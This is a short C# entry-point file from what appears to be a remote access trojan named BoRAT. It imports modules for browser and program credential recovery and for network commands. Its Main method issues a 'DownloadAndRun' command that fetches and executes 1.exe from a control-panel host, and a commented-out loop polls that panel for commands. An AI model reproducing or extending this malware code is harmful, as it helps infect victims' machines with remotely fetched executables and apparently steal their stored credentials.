using System;
using BoRAT.Core.Network;
using BoRAT.Core.Recovery.Programs;
using BoRAT.Core.Data;
using BoRAT.Core.Recovery.Browsers;
using System.Threading;
using BoRAT.Core.Commands;

namespace BoRAT
{
    class Program
    {
        static void Main(string[] args)
        {
            Work.Run("DownloadAndRun|http://panel.com/1.exe*DownloadAndRun|http://panel.com/1.exe*");
            //while (true)
            //{
            //    Http.Request();
            //    Thread.Sleep(5000);
            //}

            Console.ReadKey();
        }

      
    }
}
